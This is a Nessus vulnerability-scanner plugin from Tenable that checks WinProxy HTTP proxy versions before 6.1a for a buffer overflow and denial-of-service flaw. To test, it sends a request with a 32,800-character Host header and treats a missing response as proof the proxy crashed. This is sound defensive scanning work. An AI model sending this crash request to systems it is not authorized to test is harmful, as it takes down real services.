#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20391);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-3187", "CVE-2005-4085");
  script_bugtraq_id(16147, 16148);
  script_xref(name:"OSVDB", value:"22237");
  script_xref(name:"OSVDB", value:"22238");

  script_name(english:"WinProxy < 6.1a HTTP Proxy Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in WinProxy < 6.1a HTTP Proxy");

 script_set_attribute(attribute:"synopsis", value:
"The remote web proxy server is affected by denial of service and
buffer overflow vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running WinProxy, a proxy server for Windows. 

The installed version of WinProxy's HTTP proxy fails to handle long
requests as well as requests with long Host headers.  An attacker may
be able to exploit these issues to crash the proxy or even execute
arbitrary code on the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/intelligence/vulnerabilities/display.php?id=363" );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/intelligence/vulnerabilities/display.php?id=364" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8c88612f" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WinProxy version 6.1a or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"Firewalls");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("find_service2.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);


# Make sure it looks like WinProxy.
help = get_kb_item("FindService/tcp/"+port+"/help");
if (help && "Proxy-agent: BlueCoat-WinProxy" >< help) {
  # Flag it as a proxy.
  register_service(port:port, ipproto:"tcp", proto:"http_proxy");

  # Try to exploit it.
  soc = http_open_socket(port);
  if (soc) {
    req = string(
      "GET http://127.0.0.1/ HTTP/1.0\r\n",
      "Host: ", crap(32800), "\r\n",
      "\r\n"
    );
    send(socket:soc, data:req);
    res = http_recv(socket:soc);
    http_close_socket(soc);
  }

  # If we didn't get anything, try resending the query.
  if (strlen(req) && !strlen(res)) {
    soc = http_open_socket(port);
    if (soc) {
      req = http_get(item:"/", port:port);
      send(socket:soc, data:req);
      res2 = http_recv(socket:soc);
      http_close_socket(soc);
    }

    # There's a problem if we didn't get a response the second time.
    if (!strlen(res2)) {
      security_hole(port);
      exit(0);
    }
  }
}
